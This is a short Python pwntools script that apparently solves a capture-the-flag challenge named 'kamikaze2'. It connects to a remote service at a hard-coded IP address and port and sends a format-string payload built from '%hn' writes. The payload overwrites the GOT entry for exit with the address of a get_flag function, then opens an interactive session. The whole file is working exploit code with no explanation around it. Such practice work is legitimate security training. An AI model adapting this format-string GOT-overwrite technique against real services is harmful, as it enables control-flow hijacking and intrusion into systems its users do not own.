from pwn import *

io=remote('13.53.125.206',50000)
#io=process('kamikaze2')
context.terminal = ['gnome-terminal','-x','sh','-c']

exit_got=0x8422024
get_flag=0x8420736

io.recvuntil('Topic: ')

pl1='%1846'+'c'+'%15$hn'+'%268'+'c'+'%16$hn'
pl1=pl1.ljust(30,'b')
pl1+=p32(exit_got)+p32(exit_got+2)


def debug(addr):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

#debug('0x84208F5')
io.sendline(pl1)

io.interactive()